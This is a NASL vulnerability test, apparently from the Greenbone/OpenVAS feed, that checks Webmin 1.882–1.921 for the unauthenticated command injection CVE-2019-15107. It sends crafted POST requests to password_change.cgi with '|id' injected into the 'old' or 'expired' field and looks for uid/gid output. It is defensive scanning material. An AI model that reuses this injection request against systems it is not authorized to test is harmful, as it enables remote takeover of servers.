# SPDX-FileCopyrightText: 2019 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:webmin:webmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142742");
  script_version("2024-06-28T05:05:33+0000");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2019-08-19 06:13:45 +0000 (Mon, 19 Aug 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-02-28 15:23:00 +0000 (Tue, 28 Feb 2023)");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2019-15107", "CVE-2019-15231");

  script_name("Webmin 1.882 <= 1.921 RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("webmin.nasl");
  script_mandatory_keys("usermin_or_webmin/installed");

  script_tag(name:"summary", value:"Webmin is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The parameter old in password_change.cgi contains a command injection
  vulnerability. The password change module has to be enabled to be exploitable.");

  script_tag(name:"impact", value:"Successful exploitation would allow an unauthenticated attacker to gain
  control over the target system.");

  script_tag(name:"affected", value:"Webmin versions 1.882 to 1.921.");

  script_tag(name:"solution", value:"Update to version 1.930 or later.");

  script_xref(name:"URL", value:"https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html");
  script_xref(name:"URL", value:"http://webmin.com/security.html");
  script_xref(name:"URL", value:"http://webmin.com/exploit.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

vt_strings = get_vt_strings();
user = vt_strings["lowercase"];

url = "/password_change.cgi";

headers = make_array("Referer", http_report_vuln_url(port: port, url: "/session_login.cgi", url_only: TRUE),
                     "Content-Type", "application/x-www-form-urlencoded",
                     "Cookie", "redirect=1; testing=1; sid=x; sessiontest=1");

data = "user=" + user + "&pam=&expired=2&old=test|id&new1=test2&new2=test2";

req = http_post_put_req(port: port, url: url, add_headers: headers, data: data);
res = http_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && res =~ "uid=[0-9]+.*gid=[0-9]+") {
  uid = eregmatch(pattern: "uid=[0-9]+.*gid=[0-9]+[^<]+", string: res);
  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + uid[0];
  security_message(port: port, data: report);
  exit(0);
}

data = "user=" + user + "&pam=&expired=2|id&old=test&new1=test2&new2=test2";

req = http_post_put_req(port: port, url: url, add_headers: headers, data: data);
res = http_send_recv(port: port, data: req);

if (res =~ "uid=[0-9]+.*gid=[0-9]+") {
  uid = eregmatch(pattern: "uid=[0-9]+.*gid=[0-9]+[^<]+", string: res);
  report = 'It was possible to execute the "id" command.\n\nResult:\n\n' + uid[0];
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
